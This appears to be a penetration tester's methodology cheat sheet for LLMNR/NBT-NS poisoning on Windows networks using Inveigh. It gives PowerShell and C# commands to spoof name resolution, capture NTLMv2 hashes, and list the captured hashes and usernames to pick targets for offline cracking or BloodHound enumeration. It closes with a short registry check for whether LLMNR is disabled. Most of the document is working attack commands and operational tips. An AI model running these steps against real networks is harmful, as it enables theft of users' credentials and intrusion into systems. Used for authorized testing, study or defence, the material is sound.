## LLMNR/NBT-NS Poisoning Methodology

1. Confirm **local admin** privileges on the Windows attack host to enable packet sniffing and socket binding.
2. Identify if port 80 or 445 are occupied by existing services to anticipate **listener failures**.
3. Execute Inveigh to spoof LLMNR/NBNS and capture NTLMv2 hashes.
4. Interact with the session to extract unique hashes and target usernames.
5. Pivot to offline cracking or BloodHound enumeration to determine the value of captured credentials.

---

## LLMNR/NBT-NS Poisoning (PowerShell)

Operating from a Windows host with **local admin** where PowerShell is the preferred execution environment.

List available parameters and configurations

```
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

Start spoofing with NBNS enabled and simultaneous console/file logging

```
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Stop the poisoning process

```
Stop-Inveigh
```

- **Tool comparison**
    
    - Inveigh (PowerShell) -> `Invoke-Inveigh` -> Use only if the C# executable is blocked or environment restricts binaries; **no longer updated** by the author.
    - Inveigh (C#) -> `Inveigh.exe` -> Primary choice for active development and interactive console features.
- **Gotchas**
    
    - **An attempt was made to access a socket in a way forbidden by its access permissions** indicates port 80/445 is already bound by a system service.
    - **Local administrator** rights are strictly required for the tool to function.

## LLMNR/NBT-NS Poisoning (C#)

Operating from a Windows host with **local admin** using the maintained version of the tool.

Run with default settings for packet sniffing and listeners

```
.\Inveigh.exe
```

- **Dangerous / misconfigured settings**
    
    - Running without **Elevated Privilege Mode** will prevent the packet sniffer and listeners from starting.
    - Leaving default TTLs may cause client-side caching that extends beyond the engagement window.
- **Gotchas**
    
    - **Failed to start HTTP listener on port 80** occurs when the system is already running a web service.

## Captured Hash Extraction

Extracted credentials need to be formatted for offline cracking or account prioritization after a successful capture.

Enter or exit the interactive management console

```
ESC
```

View all captured unique NTLMv2 hashes for cracking

```
GET NTLMV2UNIQUE
```

List usernames and source IPs to identify high-value targets

```
GET NTLMV2USERNAMES
```

Stop all background listeners and spoofing threads

```
STOP
```

- **Edge cases**
    - If **mDNS** is required, it must be manually enabled as it is often disabled by default in the C# version.

> ⚠️ Gap: Tool requires **local administrator** privileges to perform packet sniffing and bind to protected ports; without these, the spoofer will fail to initialize.

## Defensive Configuration Detection

Audit host settings to determine if poisoning is viable.

Check if LLMNR is disabled via registry

```
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast
```

- **Gotchas**
    - **Value of 0** means LLMNR is disabled and poisoning attempts for this protocol will fail.